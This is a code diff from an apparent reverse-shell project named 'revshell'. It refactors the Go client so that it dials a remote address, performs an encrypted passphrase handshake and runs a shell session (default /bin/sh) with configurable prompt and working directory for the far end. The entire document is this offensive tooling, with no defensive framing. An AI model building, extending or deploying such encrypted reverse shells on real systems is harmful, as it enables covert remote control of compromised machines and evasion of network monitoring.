@@ -8,18 +8,56 @@ import (
 	"log"
 	"net"
 	"os"
-	"os/signal"
 	"strings"
-	"syscall"
 
 	"revshell/pkg/secureio"
+	"revshell/pkg/terminal"
 )
 
+type clientOptions struct {
+	addr       string
+	passphrase string
+	cipher     string
+	shell      string
+	prompt     string
+	workdir    string
+}
+
 func main() {
+	opts := parseFlags()
+
+	conn, err := net.Dial("tcp", opts.addr)
+	if err != nil {
+		log.Fatalf("client: failed to connect to %s: %v", opts.addr, err)
+	}
+	defer conn.Close()
+
+	reader, writer, err := secureio.Handshake(conn, false, opts.passphrase, opts.cipher)
+	if err != nil {
+		log.Fatalf("client: handshake failed: %v", err)
+	}
+
+	log.Printf("client: connected to %s using %s cipher", opts.addr, opts.cipher)
+
+	sessionOpts := terminal.Options{Prompt: opts.prompt, Shell: opts.shell, InitialDir: opts.workdir}
+	session, err := terminal.NewSession(reader, writer, sessionOpts)
+	if err != nil {
+		log.Fatalf("client: failed to create session: %v", err)
+	}
+
+	if err := session.Run(); err != nil && !errors.Is(err, io.EOF) {
+		log.Printf("client: session ended with error: %v", err)
+	}
+}
+
+func parseFlags() clientOptions {
 	available := strings.Join(secureio.ListCipherSuites(), ", ")
 	addr := flag.String("addr", "127.0.0.1:2222", "remote server address")
 	pass := flag.String("pass", "", "shared passphrase used to derive encryption keys")
 	cipherName := flag.String("cipher", "aes", fmt.Sprintf("cipher suite to use (%s)", available))
+	shell := flag.String("shell", "/bin/sh", "shell executable used to run commands")
+	prompt := flag.String("prompt", "", "prompt template forwarded to the remote shell (supports {{.USER}}, {{.HOST}}, {{.CWD}}, {{.BASENAME}})")
+	workdir := flag.String("workdir", "", "initial working directory for new sessions")
 	flag.Parse()
 
 	if *pass == "" {
@@ -27,50 +65,12 @@ func main() {
 		os.Exit(1)
 	}
 
-	conn, err := net.Dial("tcp", *addr)
-	if err != nil {
-		log.Fatalf("client: failed to connect to %s: %v", *addr, err)
-	}
-	defer conn.Close()
-
-	reader, writer, err := secureio.Handshake(conn, false, *pass, *cipherName)
-	if err != nil {
-		log.Fatalf("client: handshake failed: %v", err)
-	}
-
-	log.Printf("client: connected to %s using %s cipher", *addr, *cipherName)
-
-	doneReading := make(chan error, 1)
-	doneWriting := make(chan error, 1)
-
-	go func() {
-		_, err := io.Copy(os.Stdout, reader)
-		doneReading <- err
-	}()
-
-	go func() {
-		_, err := io.Copy(writer, os.Stdin)
-		if tcpConn, ok := conn.(*net.TCPConn); ok {
-			_ = tcpConn.CloseWrite()
-		}
-		doneWriting <- err
-	}()
-
-	sigCh := make(chan os.Signal, 1)
-	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
-
-	var readErr error
-	select {
-	case readErr = <-doneReading:
-		if readErr != nil && !errors.Is(readErr, io.EOF) {
-			log.Printf("client: read error: %v", readErr)
-		}
-	case sig := <-sigCh:
-		log.Printf("client: received signal %s, shutting down", sig)
-	}
-
-	_ = conn.Close()
-	if writeErr := <-doneWriting; writeErr != nil && !errors.Is(writeErr, os.ErrClosed) {
-		log.Printf("client: write error: %v", writeErr)
+	return clientOptions{
+		addr:       *addr,
+		passphrase: *pass,
+		cipher:     *cipherName,
+		shell:      *shell,
+		prompt:     *prompt,
+		workdir:    *workdir,
 	}
 }
